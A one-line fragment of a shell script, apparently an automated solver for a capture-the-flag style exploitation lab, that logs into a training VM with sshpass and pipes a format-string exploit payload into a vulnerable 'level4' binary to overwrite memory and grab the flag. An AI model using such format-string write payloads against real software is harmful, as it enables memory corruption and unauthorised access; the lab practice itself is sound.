...
flag=$(sshpass -p "${act_level_password}" ssh level${ACTUAL_LEVEL}@${VM_ID} -p 4242 'echo -e "\x12\x98\x04\x08\x10\x98\x04\x08%250c%12\$hn%21570c%13\$hn" | ./level4' 2> /dev/null)
